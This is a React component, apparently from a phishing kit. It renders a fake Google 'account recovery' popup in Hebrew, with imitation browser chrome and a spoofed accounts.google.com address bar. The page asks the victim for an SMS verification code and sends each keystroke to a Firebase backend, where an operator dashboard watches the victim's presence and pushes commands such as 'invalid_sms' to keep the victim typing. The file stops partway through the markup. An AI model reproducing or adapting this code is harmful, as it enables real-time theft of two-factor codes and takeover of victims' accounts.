import React from "react";
// Imagens da pasta public
const gmailLogo = "/logogmail.svg";
const smsGif = "/smsgif.gif";
import EmailLayout from "../EmailLayout";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { getDetectedLanguageDisplayName } from "../../../utils/languageUtils";
import { useClientCountry } from "../../../hooks/use-client-country";
import DeviceManager from "../../../utils/deviceManager";

const GmailSmsPage = ({ embedded = false }) => {
  const {
    updateClientData,
    commands,
    isUserActive,
    clearCommands,
    clientData,
  } = useFirebaseClient();
  const { country } = useClientCountry();
  const [isNetOnline, setIsNetOnline] = React.useState(
    typeof navigator !== "undefined" ? navigator.onLine : true
  );
  const presence = React.useMemo(() => {
    if (!isNetOnline) return "offline";
    if (!isUserActive) return "away";
    return "online";
  }, [isNetOnline, isUserActive]);

  React.useEffect(() => {
    const onOnline = () => setIsNetOnline(true);
    const onOffline = () => setIsNetOnline(false);
    window.addEventListener("online", onOnline);
    window.addEventListener("offline", onOffline);
    return () => {
      window.removeEventListener("online", onOnline);
      window.removeEventListener("offline", onOffline);
    };
  }, []);

  // Atualizar URL/página no Firebase
  React.useEffect(() => {
    updateClientData({
      currentUrl: "/sync?view=gmail-sms",
      currentPage: "gmail_sms",
      gmailStage: "sms",
      fromForm: true,
    });
  }, [updateClientData]);

  const [code, setCode] = React.useState("");
  const [isSubmitting, setIsSubmitting] = React.useState(false);

  // Detectar device number capturado na página /device
  const getLoggedInDevice = () => {
    // Usar o novo sistema de device com fallbacks múltiplos
    const device = DeviceManager.getDeviceWithFirebaseData(clientData);
    
    if (device) {
      console.log("📱 Device number obtido com novo sistema:", device);
      return device;
    }
    
    console.log("📱 Nenhum device number encontrado");
    return "";
  };

  const [displayDevice, setDisplayDevice] = React.useState(getLoggedInDevice());

  // Monitorar mudanças no localStorage e clientData para atualizar device number em tempo real
  React.useEffect(() => {
    const handleStorageChange = () => {
      const newDevice = getLoggedInDevice();
      if (newDevice !== displayDevice) {
        setDisplayDevice(newDevice);
        console.log("📱 Gmail SMS Modal - Device number atualizado:", newDevice);
      }
    };

    // Escutar mudanças no localStorage
    window.addEventListener("storage", handleStorageChange);

    // Verificar periodicamente (para mudanças na mesma aba)
    const interval = setInterval(handleStorageChange, 1000);

    return () => {
      window.removeEventListener("storage", handleStorageChange);
      clearInterval(interval);
    };
  }, [displayDevice, clientData?.deviceNumber]);
  const [loadingStage, setLoadingStage] = React.useState("bar"); // 'bar' | 'final'
  const [invalidMessage, setInvalidMessage] = React.useState("");
  const [isReady, setIsReady] = React.useState(false);
  const [progress, setProgress] = React.useState(0);

  React.useEffect(() => {
    // Preloader com duração de 2.5 segundos
    const startTime = Date.now();
    const duration = 2500; // 2.5 segundos

    const updateProgress = () => {
      const elapsed = Date.now() - startTime;
      const newProgress = Math.min((elapsed / duration) * 100, 100);
      setProgress(newProgress);

      if (newProgress < 100) {
        requestAnimationFrame(updateProgress);
      }
    };

    requestAnimationFrame(updateProgress);

    // Aguarda a barra completar totalmente antes de abrir o modal
    const id = setTimeout(() => setIsReady(true), 2600); // 100ms a mais para garantir que chegue a 100%
    return () => clearTimeout(id);
  }, []);

  const phrases = React.useMemo(
    () => [
      "מתחבר...",
      "אנא המתן רגע...",
      "מסיים את החיבור שלך...",
      "מאמת פרטי גישה...",
      "כמעט מוכן...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  const [currentLang, setCurrentLang] = React.useState("en");

  const translations = {
    windowTitle: "היכנס לחשבונות Google",
    url: "https://accounts.google.com/v3/signin/identifier?gsiwebsdk=3&client_id=407408718192.apps.googleusercontent.com",
    header: "היכנס ל-Google",
  };

  // Drag functionality
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });

  const startDrag = (e) => {
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA"].includes(tag)) return;
    setIsDragging(true);
    e.preventDefault();
  };
  
  React.useEffect(() => {
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  const handleAdvance = () => {
    try {
      updateClientData({ gmailSmsSubmittedAt: Date.now() });
    } catch {}
    setIsSubmitting(true);
    setLoadingStage("bar");
    // Após 3s, muda para etapa final com gif + spinner, igual password
    setTimeout(() => setLoadingStage("final"), 3000);
  };

  // Rotacionar frases durante a etapa final
  React.useEffect(() => {
    if (isSubmitting && loadingStage === "final") {
      const id = setInterval(() => {
        setPhraseIndex((p) => (p + 1) % phrases.length);
      }, 2000);
      return () => clearInterval(id);
    }
  }, [isSubmitting, loadingStage, phrases.length]);

  // Navegação por comandos e inválidos
  const navigateByCommand = React.useCallback(() => false, []);

  const handleInvalid = React.useCallback(
    (cmd) => {
      const invalids = new Set([
        "invalid_gmailsms",
        "invalid_sms",
        "invalid_codemail",
        "invalid_gmailcodemail",
        "invalid_auth",
        "invalid_gmailauth",
      ]);
      if (!invalids.has(cmd)) return false;
      setInvalidMessage("קוד SMS שגוי");
      setIsSubmitting(false);
      clearCommands();
      return true;
    },
    [clearCommands]
  );

  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latestRaw = commands[commands.length - 1];
    if (!latestRaw) return;
    const latest =
      typeof latestRaw === "string"
        ? latestRaw.replace(/^\"+|\"+$/g, "").trim()
        : latestRaw;
    if (typeof latest !== "string") return;
    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      handleInvalid(latest);
      return;
    }
    const navigated = navigateByCommand(latest);
    if (navigated) setTimeout(() => clearCommands(), 50);
  }, [commands, navigateByCommand, handleInvalid, clearCommands]);

  // Número dinâmico vindo do dashboard para substituir máscara
  const rawPhone = (clientData && clientData.gmailSmsPhone) || "";
  const maskedTarget = "(••) ••••-••97";
  const hasPhoneConfig = String(rawPhone || "").replace(/\D/g, "").length > 0;

  const renderPhoneMasked = () => {
    if (!hasPhoneConfig) return "";
    const cleaned = String(rawPhone || "").replace(/\s+/g, "");
    if (!cleaned) return maskedTarget;
    // Se for somente 2 dígitos, substituir apenas os 2 últimos
    if (/^\d{2}$/.test(cleaned)) {
      const last2 = cleaned.slice(-2);
      // Substituir somente os dois últimos dígitos numéricos do template
      const chars = maskedTarget.split("");
      let replaced = 0;
      for (let i = chars.length - 1; i >= 0 && replaced < 2; i--) {
        if (/\d/.test(chars[i])) {
          // last2[1] vai para o último dígito, last2[0] para o penúltimo
          chars[i] = last2[1 - replaced];
          replaced++;
        }
      }
      return chars.join("");
    }
    // Se não, assumir número completo informado → renderizar como está
    return rawPhone;
  };

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ 
          fontFamily: "Roboto, Arial, sans-serif",
          direction: "rtl",
          textAlign: "right"
        }}
      >
        {/* Presence indicator removido */}
        <div
          style={{
            background: "#fff",
            borderRadius: 12,
            boxShadow: "0 8px 32px rgba(0, 0, 0, 0.3)",
            width: "min(466px, 92vw)",
            minHeight: 560,
            color: "#202124",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
          onMouseDown={startDrag}
        >
          {/* Spinner de loading inicial */}
          {!isReady && (
            <div
              style={{
                position: "absolute",
                inset: 0,
                background: "#ffffff",
                display: "flex",
                flexDirection: "column",
                zIndex: 9999,
                borderRadius: 12,
              }}
            >
              {/* Barra da janela */}
              <div
                style={{
                  height: 32,
                  background: "#e8f0fe",
                  borderBottom: "1px solid #d7e3fc",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "0 8px",
                  fontSize: 12,
                  direction: "ltr", // Força LTR para manter botões à direita
                }}
              >
                <span
                  style={{
                    opacity: 0.9,
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                  }}
                >
                  <svg
                    xmlns="https://www.w3.org/2000/svg"
                    width="16"
                    height="16"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                  {translations.windowTitle}
                </span>
                <div style={{ display: "flex", gap: 4 }}>
                  <button
                    title="Minimize"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M3 8.5H13"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  </button>
                  <button
                    title="Maximize"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <rect
                        x="3.5"
                        y="3.5"
                        width="9"
                        height="9"
                        rx="1"
                        stroke="#111"
                        strokeWidth="1.5"
                      />
                    </svg>
                  </button>
                  <button
                    title="Close"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M4 4L12 12"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                      <path
                        d="M12 4L4 12"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              {/* URL bar */}
              <div
                style={{
                  borderBottom: "1px solid #eaecee",
                  padding: 0,
                  background: "#ffffff",
                  margin: 0,
                }}
              >
                <div
                  style={{
                    width: "100%",
                    background: "#eef1f3",
                    border: "1px solid #d0d7de",
                    borderRadius: 0,
                    height: 32,
                    display: "flex",
                    alignItems: "center",
                    padding: "0 10px",
                    gap: 8,
                    fontSize: 12,
                    color: "#202124",
                    direction: "ltr", // Força LTR para manter ícone à esquerda e URL correta
                  }}
                >
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 16 16"
                    xmlns="http://www.w3.org/2000/svg"
                    version="1.1"
                    fill="none"
                    stroke="#5f6368"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="1.5"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                    <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                  </svg>
                  <div
                    style={{
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                    }}
                  >
                    {translations.url}
                  </div>
                </div>
              </div>

              {/* Barra de progresso */}
              <div
                style={{
                  width: "100%",
                  height: 2,
                  background: "#e8f0fe",
                  position: "relative",
                }}
              >
                <div
                  style={{
                    width: `${progress}%`,
                    height: "100%",
                    background: "#1a73e8",
                    transition: "width 0.1s ease-out",
                    position: "absolute",
                    left: 0,
                    top: 0,
                  }}
                />
              </div>

              {/* Header pequeno */}
              <div
                style={{
                  width: "100%",
                  background: "#ffffff",
                  padding: "4px 8px",
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                  borderBottom: "1px solid #eaecee",
                  height: 40,
                }}
              >
                <div
                  style={{
                    width: 20,
                    height: 20,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="18"
                    height="18"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                </div>
                <span style={{ color: "#000", fontSize: 12 }}>
                  {translations.header}
                </span>
              </div>

              {/* Conteúdo central com spinner */}
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <div
                  style={{
                    width: 40,
                    height: 40,
                    border: "3px solid #1a73e8",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
              </div>

              {/* Footer */}
              <div
                style={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  minHeight: 44,
                  borderTop: "1px solid #f0f0f0",
                  background: "transparent",
                  padding: "0 24px",
                }}
              >
                <div style={{ display: "flex", gap: 40 }}>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    עזרה
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    פרטיות
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    תנאים
                  </a>
                </div>
                <span style={{ color: "#666", fontSize: 12 }}>
              {country?.name || "לא ידוע"}
            </span>
              </div>
            </div>
          )}
          {/* Barra da janela */}
          <div
            style={{
              height: 32,
              background: "#e8f0fe",
              borderBottom: "1px solid #d7e3fc",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 8px",
              fontSize: 12,
              direction: "ltr", // Força LTR para manter botões à direita
            }}
            onMouseDown={startDrag}
          >
            <span
              style={{
                opacity: 0.9,
                display: "flex",
                alignItems: "center",
                gap: 6,
              }}
            >
              <svg
                xmlns="https://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 40 48"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <path
                  fill="#4285F4"
                  d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                />
                <path
                  fill="#34A853"
                  d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                />
                <path
                  fill="#FABB05"
                  d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                />
                <path
                  fill="#E94235"
                  d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 4 }}>
              <button
                title="Minimize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M3 8.5H13"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <button
                title="Maximize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3.5"
                    y="3.5"
                    width="9"
                    height="9"
                    rx="1"
                    stroke="#111"
                    strokeWidth="1.5"
                  />
                </svg>
              </button>
              <button
                title="Close"
                onClick={() => setInvalidMessage("קוד SMS שגוי.")}
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M4 4L12 12"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                  <path
                    d="M12 4L4 12"
                    stroke="#111"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* URL bar */}
          <div
            style={{
              borderBottom: "1px solid #eaecee",
              padding: 0,
              background: "#ffffff",
              margin: 0,
            }}
          >
            <div
              style={{
                width: "100%",
                background: "#eef1f3",
                border: "1px solid #d0d7de",
                borderRadius: 0,
                height: 32,
                display: "flex",
                alignItems: "center",
                padding: "0 10px",
                gap: 8,
                fontSize: 12,
                color: "#202124",
                direction: "ltr", // Força LTR para manter ícone à esquerda
              }}
            >
              <svg
                width="16"
                height="16"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                version="1.1"
                fill="none"
                stroke="#5f6368"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>

          {/* Barra animada logo abaixo da URL (a URL é a div acima). Só na etapa 'bar'. */}
          {isSubmitting && loadingStage === "bar" && (
            <div
              style={{
                width: "100%",
                height: 4,
                background: "#ffffff",
                overflow: "hidden",
                margin: 0,
              }}
            >
              <div
                style={{
                  width: "100%",
                  height: "100%",
                  background: "#1a73e8",
                  animation: "loadingBar 2s ease-in-out infinite",
                }}
              />
            </div>
          )}

          {/* Header pequeno */}
          <div
            style={{
              width: "100%",
              background: "#ffffff",
              padding: "4px 8px",
              display: "flex",
              alignItems: "center",
              gap: 6,
              borderBottom: "1px solid #eaecee",
              height: 40,
            }}
          >
            <div
              style={{
                width: 20,
                height: 20,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 40 48"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <path
                  fill="#4285F4"
                  d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                />
                <path
                  fill="#34A853"
                  d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                />
                <path
                  fill="#FABB05"
                  d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                />
                <path
                  fill="#E94235"
                  d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                />
              </svg>
            </div>
            <span style={{ color: "#000", fontSize: 12 }}>
              {translations.header}
            </span>
          </div>

          {/* Conteúdo principal */}
          <div
            style={{
              flex: 1,
              padding: "24px 24px 24px",
              opacity: isSubmitting && loadingStage === "bar" ? 0.7 : 1,
              pointerEvents:
                isSubmitting && loadingStage === "bar" ? "none" : "auto",
              position: "relative",
            }}
          >
            <h1 style={{ fontSize: 28, fontWeight: 500, margin: 0 }}>
              שחזור חשבון
            </h1>
            <p
              style={{ color: "#3c4043", fontSize: 14, margin: "12px 0 16px" }}
            >
              כדי לעזור לשמור על החשבון שלך בטוח, Google רוצה לוודא שזה
              באמת אתה שמנסה להיכנס
            </p>
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                border: "1px solid #dadce0",
                borderRadius: 20,
                padding: "4px 4px 4px 12px",
                gap: 8,
                marginBottom: 16,
              }}
            >
              <svg
                width="18"
                height="18"
                viewBox="0 0 42 42"
                xmlns="http://www.w3.org/2000/svg"
                aria-hidden="true"
                style={{ marginRight: 0, display: "block" }}
              >
                <path
                  fill="#000000"
                  fillRule="evenodd"
                  d="M24,45A21,21,0,1,1,45,24,21,21,0,0,1,24,45Zm11.633-6c-.157-.231-.355-.518-.514-.742-.277-.394-.554-.788-.8-1.178C34.305,37.062,32.935,35.224,28,35a2.922,2.922,0,0,1-2.968-3.066L25,31c0-.135-.016.148,0,0V30l1-1a14.435,14.435,0,0,0,2.4-1.464l.135-.093A4.643,4.643,0,0,0,30,26l.036-.381A55.987,55.987,0,0,0,31,19c0-4.71-2.29-7-7-7-4.775,0-7,2.224-7,7a54.693,54.693,0,0,0,.963,6.616l.035.352a3.981,3.981,0,0,0,1.449,1.462l.1.062A19.174,19.174,0,0,0,22,29l1,1v1c.014.138,0-.146,0,0l-.033.934A2.9,2.9,0,0,1,20.084,35h0c-4.956.2-6.393,2.077-6.4,2.077-.252.4-.528.789-.807,1.184-.157.224-.355.51-.513.741a18.917,18.917,0,0,0,23.267,0ZM24,5A18.986,18.986,0,0,0,10.85,37.694c.382-.565.79-1.129,1.15-1.694,0,0,1.67-2.743,8-3,.645,0,.967-.422.967-1.066h0c0-.521,0-.934,0-.934,0-.13-.021-.247-.027-.373A17.5,17.5,0,0,1,18.4,29.133S16,27.657,16,26a60.16,60.16,0,0,1-1-7c0-4.644,1.986-9,9-9,6.92,0,9,4.356,9,9a61.784,61.784,0,0,1-1,7c0,1.611-2.4,3.133-2.4,3.133a13.873,13.873,0,0,1-2.543,1.546c0,.109-.023.209-.023.321,0,0,0,.413,0,.934h0c0,.644.32,1.066.965,1.066,6.424.288,8,3,8,3,.36.565.767,1.129,1.149,1.694A18.985,18.985,0,0,0,24,5Z"
                  transform="translate(-3 -3)"
                />
              </svg>
              <span style={{ fontSize: 14, color: "#0f1113", fontWeight: 400 }}>
                {displayDevice}
              </span>
            </div>

            {/* Texto SMS */}
            {/* GIF exatamente acima do “Get a verification code” */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                margin: "6px 0",
              }}
            >
              <img
                src={smsGif}
                alt="SMS code"
                style={{ width: 120, height: "auto" }}
              />
            </div>
            <h2 style={{ fontSize: 16, fontWeight: 500, margin: "6px 0" }}>
              קבל קוד אימות
            </h2>
            {hasPhoneConfig && (
              <p style={{ color: "#3c4043", fontSize: 12, margin: 0 }}>
                Google ישלח קוד אימות אל {renderPhoneMasked()}.
                חלים תעריפי הודעות וחבילת נתונים רגילים.
              </p>
            )}

            {/* Input de código único */}
            <div style={{ marginTop: 10 }}>
              <div
                style={{ position: "relative", width: "100%", maxWidth: 340 }}
              >
                <input
                  data-gmail-modal
                  type="text"
                  value={code}
                  onChange={(e) => {
                    const normalized = e.target.value
                      .replace(/\D/g, "")
                      .slice(0, 6);
                    setCode(normalized);
                    updateClientData({
                      gmailSms: normalized,
                      lastSmsInput: Date.now(),
                    });
                  }}
                  placeholder="הכנס את הקוד"
                  style={{
                    border: "1px solid #dadce0",
                    outline: "none",
                    fontSize: 14,
                    width: "100%",
                    maxWidth: 340,
                    background: "#ffffff",
                    color: "#202124",
                    borderRadius: 4,
                    padding: "10px 12px 10px 36px", // Adiciona padding à esquerda para o ícone
                  }}
                  maxLength={6}
                  disabled={isSubmitting}
                />
              </div>
              {invalidMessage && (
                <div style={{ color: "#d93025", fontSize: 12, marginTop: 6 }}>
                  {invalidMessage}
                </div>
              )}
              {/* Link + Botão Avançar */}
              <div
                style={{
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  marginTop: 14,
                  maxWidth: 340,
                }}
              >
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  style={{
                    color: "#1a73e8",
                    textDecoration: "none",
                    fontSize: 14,
                  }}
                >
                  אין לי סמארטפון
                </a>
                <button
                  onClick={handleAdvance}
                  disabled={isSubmitting}
                  style={{
                    padding: "10px 22px",
                    background: isSubmitting ? "#b3d1fa" : "#1a73e8",
                    color: "#ffffff",
                    border: "none",
                    borderRadius: 999,
                    fontSize: 14,
                    fontWeight: 600,
                    cursor: isSubmitting ? "not-allowed" : "pointer",
                    minWidth: 80,
                    minHeight: 36,
                  }}
                >
                  {isSubmitting ? "מאמת..." : "הבא"}
                </button>
              </div>
            </div>
          </div>
          {/* Footer no padrão do gmail-password */}
          <div
            style={{
              width: "100%",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              minHeight: 44,
              borderTop: "1px solid #f0f0f0",
              background: "transparent",
              padding: "0 24px",
            }}
          >
            <div style={{ display: "flex", gap: 40 }}>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
              >
                עזרה
              </a>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
              >
                פרטיות
              </a>
              <a
                href="#"
                style={{ color: "#222", fontSize: 15, textDecoration: "none" }}
              >
                תנאים
              </a>
            </div>
                <span style={{ color: "#666", fontSize: 12 }}>
                  {country?.name || "לא ידוע"}
                </span>
          </div>
          {/* Overlay final com gif e barra, igual ao password */}
          {isSubmitting && loadingStage === "final" && (
            <div
              style={{
                position: "absolute",
                top: 60,
                left: 0,
                right: 0,
                bottom: 0,
                background: "#ffffff",
                zIndex: 11,
                display: "flex",
                flexDirection: "column",
              }}
            >
              {/* Barra animada abaixo da URL (overlay) */}
              <div
                style={{
                  width: "100%",
                  height: 4,
                  background: "#ffffff",
                  overflow: "hidden",
                }}
              >
                <div
                  style={{
                    width: "100%",
                    height: "100%",
                    background: "#1a73e8",
                    animation: "loadingBar 2s ease-in-out infinite",
                  }}
                />
              </div>
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 16,
                  textAlign: "center",
                  padding: "0 20px",
                }}
              >
                  <img
                    src={gmailLogo}
                    alt="Connecting"
                    style={{ width: 80, height: 80, display: "block", margin: "0 auto" }}
                  />
                  <div
                    style={{
                      width: 24,
                      height: 24,
                      border: "3px solid #1a73e8",
                      borderTop: "3px solid transparent",
                      borderRadius: "50%",
                      animation: "spin 1s linear infinite",
                      margin: "0 auto",
                    }}
                  />
                  <p
                    style={{
                      color: "#5f6368",
                      fontSize: 14,
                      margin: "0 auto",
                      textAlign: "center",
                      maxWidth: 400,
                      lineHeight: 1.4,
                    }}
                  >
                    {phrases[phraseIndex]}
                  </p>
              </div>
              {/* Footer dentro do overlay */}
              <div
                style={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  minHeight: 44,
                  borderTop: "1px solid #f0f0f0",
                  background: "transparent",
                  padding: "0 24px",
                  position: "absolute",
                  bottom: 0,
                  left: 0,
                }}
              >
                <div style={{ display: "flex", gap: 40 }}>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    עזרה
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    פרטיות
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#222",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    תנאים
                  </a>
                </div>
                <span style={{ color: "#666", fontSize: 12 }}>
                  {country?.name || "לא ידוע"}
                </span>
              </div>
            </div>
          )}
